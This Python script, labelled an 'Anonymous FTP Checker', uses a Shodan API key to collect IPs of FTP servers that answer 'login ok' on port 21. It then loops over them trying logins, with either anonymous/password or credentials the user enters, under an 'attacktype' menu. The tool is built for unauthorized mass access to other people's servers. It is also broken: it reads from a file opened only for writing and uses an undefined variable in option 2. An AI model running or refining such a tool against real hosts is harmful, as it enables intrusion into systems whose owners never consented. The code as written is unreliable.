import shodan
import subprocess
import socket
import os
from ftplib import FTP
import time

ipfile = open('ips.txt', 'w')
fileexists = os.path.isfile("goodkeys.txt")


def main():
    print("Anonymous FTP Checker Based On List Query")
    apikey = input("Shodan api key: ")

    savetofile = input(
        "would you like to save this to a file for future, (y/n): ")
    if savetofile == "y":
        apifile = open("goodkeys.txt", "w")
        apifile.write(apikey)
    else:
        print("Continuing")
    searchquery = "'login ok', port:21"

    api = shodan.Shodan(apikey)
    results = api.search(searchquery)

    for ip in results['matches']:
        ipfile.write(ip['ip_str'])
        time.sleep(0.3)
        ipfile.write('\n')
        print("added ip")
    print("[!] - List finished saved as ips.txt")
    attacktype = input(
        "[1] - Default credentials\n[2] - Case by case script-user done\n! ")
    if attacktype == "1":
        ipstoattack = ipfile.readlines()
        for x in ipstoattack:
            attackanondef(x, "anonymous", "password")
    if attacktype == "2":
        username_c = input("Username to use: ")
        password_c = input("Password to use: ")
        for x in ipstoattack:
            attackanondef(x, username_c, password_c)


def attackanondef(ip, usernamef, passwordf):
    ftp = FTP(ip)
    ftp.login(user=usernamef, passwd=passwordf)


main()
